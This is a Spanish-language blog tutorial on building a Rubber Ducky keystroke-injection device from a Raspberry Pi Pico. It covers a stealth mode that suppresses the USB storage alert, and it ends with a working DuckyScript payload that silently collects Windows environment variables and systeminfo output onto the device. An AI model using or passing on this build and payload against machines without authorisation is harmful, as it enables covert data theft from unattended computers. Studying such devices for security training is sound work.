---
layout: single
author_profile: true
title: Raspberry Ducky
excerpt: "Vamos a crear una Rubber Ducky a partir de una Raspberry Pi Pico. ¡Let's hack!"
date: 2022-10-19
classes: wide
header:
  teaser: /assets/images/raspberryducky/00-pico.png
  teaser_home_page: true
categories:
  - Hardware
tags:
  - Raspberry
  - Ducky
---

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/00-ducky.png">
</p>

¡Hola!
Vamos a crear una Rubber Ducky a partir de una `Raspberry Pi Pico` dejo un [link](https://www.amazon.com/s?k=raspberry+pi+pico&__mk_es_US=%C3%85M%C3%85%C5%BD%C3%95%C3%91&crid=3V38MFW16NGXP&sprefix=raspberry+pi+pic%2Caps%2C232&ref=nb_sb_noss_2) de búsqueda en amazon.

Una Rubber Ducky es un dispositivo **malicioso** en forma de USB creado por [Hack5](https://shop.hak5.org/products/usb-rubber-ducky), el cual, ejecuta comandos emulando un teclado en cuestión de segundos.

## MODOS DE USO RASPBERRY

No es obligatorio hacer uso de estos modos, sin embargo, vamos a mostrar el modo de `configuración` y modo de `sigilo` que podemos obtener de nuestra Raspberry.

### MODO CONFIGURACION

Como una buena práctica, vamos a hacer uso de este modo conectando el primer pin `GP0` y el pin 3 `GND`, que evitará la inyección del payload a la misma maquina donde vamos a conectar el dispositivo, es decir, nuestra maquina local. Lo más recomendable es hacer un **puente** entre estos pines con un cable de la siguiente manera.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/01-pico.png">
</p>

### MODO SIGILO

El modo de sigilo es utilizado para que nuestro dispositivo no se muestre como un objeto de almacenamiento USB. Este modo funciona una vez la configuración y el payload se encuentren almacenados en la Raspberry, se procede a desconectar el dispositivo y realizar un puente entre los pines 18 `GND` y 20 `GPIO15`.

De esta manera al conectar nuevamente la Raspberry no será generada una alerta de conectividad por USB.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/02-pico.png">
</p>

### MODO DE FABRICA 

Para restaurar a modo de `fabrica` la Raspberry se debe mantener presionado el botón `BOOTSEL` de color blanco en el momento de la conexión del dispositivo a la máquina.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/03-pico.png">
</p>

## REQUISITOS

Ahora que ya tenemos claros los modos de la Raspberry, vamos a conectar la Raspberry Pi Pico en modo de *fabrica*, debe mostrarse el dispositivo como `RP1-RP2`.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/04-pico.png">
</p>

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/05-pico.png">
</p>

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/06-pico.png">
</p>

Procedemos a descargar las `librerías` y `repositorios` necesarios para poder obtener nuestra Rubber Ducky en la Raspberry.

### REPOSITORIO GIT DE DBISU

Este repositorio contiene toda la información, payload y scripts para preparar la Raspberry.

```bash 
https://github.com/dbisu/pico-ducky.git
```

### CIRCUITPYTHON
 
Circuitpython nos permite ejecutar los comandos y cargar las librerías para que la Raspberry comprenda los scripts que ejecutaremos en nuestro payload, se recomienda instalar la última versión estable, en este caso `7.3.3`.

```bash 
https://downloads.circuitpython.org/bin/raspberry_pi_pico/es/adafruit-circuitpython-raspberry_pi_pico-es-7.3.3.uf2
```

Ahora procedemos a copiar `adafruit-circuitpython-raspberry_pi_pico-es-7.3.3.uf2` en la raíz de la Raspberry `RP1-RP2`.

Lo que sucederá es que el dispositivo se va a desconectar y conectar automáticamente, con el nombre nuevo `CIRCUITPY`.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/07-pico.png">
</p>

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/08-pico.png">
</p>

### LIBRERIA TECLADO

La distribución de teclados es importante para la ejecución de comandos correctamente deseados.

Descargar la librería de la misma versión descargada de Circuitpython, en este caso 7.x.

```bash 
https://github.com/adafruit/Adafruit_CircuitPython_Bundle/releases/download/20221019/adafruit-circuitpython-bundle-7.x-mpy-20221019.zip
```

Navegamos en la carpeta descomprimida y ubicamos las carpetas `adafruit_hid` y `asyncio`, de igual forma los archivos `adafruit_debouncer.mpy` y `adafruit_ticks.mpy` en lib, procedemos a copiar todo en la carpeta `lib` de la Raspberry `CIRCUITPY`.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/09-pico.png">
</p>

Copiamos ahora del repositorio git descargado los archivos `boot.py` y `duckyinpython.py` en la raíz de la Raspberry `CIRCUITPY`.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/10-pico.png">
</p>

Tenemos que realizar una modificación en `duckyinpython.py`

```bash 
#COMENTAR LAS SIGUIENTES LINEAS
#from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout
#from adafruit_hid.keycode import Keycode
```
Guardamos el archivo y renombramos el mismo por `code.py`, sobrescribiendo el archivo existente.

#### TECLADO ESPAÑOL (LATINOAMERICA)

Ingresamos a la página [neradoc](https://www.neradoc.me/layouts/) debido a que esta distribución no se encuentra por defecto en el programa.

Procedemos a ingresar la URL `https://kbdlayout.info/kbdla` en el campo de texto y damos clic en `Make Zip Bundle Links`.

Luego damos clic en `Download de zip file` y descomprimimos el archivo.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/11-pico.png">
</p>

Copiamos los archivos `keyboard_layout_win_la.py` y `keycode_win_la.py` en el directorio `lib` de la Raspberry `CIRCUITPY`.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/12-pico.png">
</p>

```bash
#DESCOMENTAR Y MODIFICAR LAS SIGUIENTES LINEAS
#ANTES
#from keyboard_layout_win_LANG import KeyboardLayout
#from keycode_win_LANG import Keycode

#DESPUES CON TECLADO LATINOAMERICA
from keyboard_layout_win_la import KeyboardLayout
from keycode_win_la import Keycode
```

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/13-pico.png">
</p>

#### TECLADO ESPAÑOL (ESPAÑA)

No se requiere el proceso de Latinoamérica, únicamente modificar las líneas de `duckyinpython.py`

```bash
#DESCOMENTAR Y MODIFICAR LAS SIGUIENTES LINEAS
#ANTES
#from keyboard_layout_win_LANG import KeyboardLayout
#from keycode_win_LANG import Keycode

#DESPUES CON TECLADO ESPAÑOL ESPAÑA
from keyboard_layout_win_es import KeyboardLayout
from keycode_win_es import Keycode
```

Guardamos el archivo y renombramos el mismo por `code.py`, sobrescribiendo el archivo existente.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/14-pico.png">
</p>

## PAYLOADS

En el siguiente enlace se encuentran diferentes [scripts](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads) predefinidos que se han generado anteriormente.

En este enlace es posible crear tus propios [Payloads](https://ducktoolkit.com/encode), incluso en el mismo bloc de notas puedes programar tus scripts.

Si quieres más información para entender este lenguaje, es bastante cómodo y en este enlace tienes la [información](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript)

Por mi parte les dejo un `script` para almacenar información general de un dispositivo en nuestro dispositivo, este script debe ser guardado en el archivo `payload.dd`

```bash
DELAY 3500
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 500
STRING echo [*] Obteniendo datos del sistema ... >> winPwn.txt
ENTER
DELAY 200
STRING set >> winPwn.txt
ENTER
STRING cls
ENTER
DELAY 200
STRING echo [*] Obteniendo informacion adicional ... >> winPwn.txt
ENTER
DELAY 200
STRING systeminfo >> winPwn.txt
ENTER
DELAY 800
STRING cls
ENTER
STRING echo [*] Informacion capturada con exito! >> winPwn.txt
ENTER
DELAY 200
STRING move winPwn.txt D:\winPwn.txt
ENTER
DELAY 300
STRING exit
ENTER
```

Finalmente desconectamos la Raspberry y ya está lista para el uso que deseamos, al conectarla en un dispositivo siempre y cuando todo este correcto, en este caso obtenemos la información de un dispositivo almacenado en nuestro dispositivo.

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/15-pico.png">
</p>

## RECOMENDACION

Debes tener en cuenta que en el momento en que tengas el script configurado en el archivo `payload.dd`, si la Raspberry no se encuentra en modo de configuración, se reiniciara y automaticamente hace la ejecucion del script definido anteriormente.

**La información de este artículo es de uso educativo, úsalo con responsabilidad.**

¡Hemos logrado nuestra primera rubber ducky con Raspberry en el blog!

<p style="text-align: center;">
<img src="/assets/images/raspberryducky/16-pico.png">
</p>

Son libres de hacerle las modificaciones que necesiten a sus scripts, es todo un mundo que queda por explorar con este dispositivo, es una ventaja que podamos crear nuestras propias herramientas para mejorar nuestra calidad de aprendizaje.

_¡Que tengan un buen día en el planeta donde se encuentren!_

**Nos vemos en otro bit.**

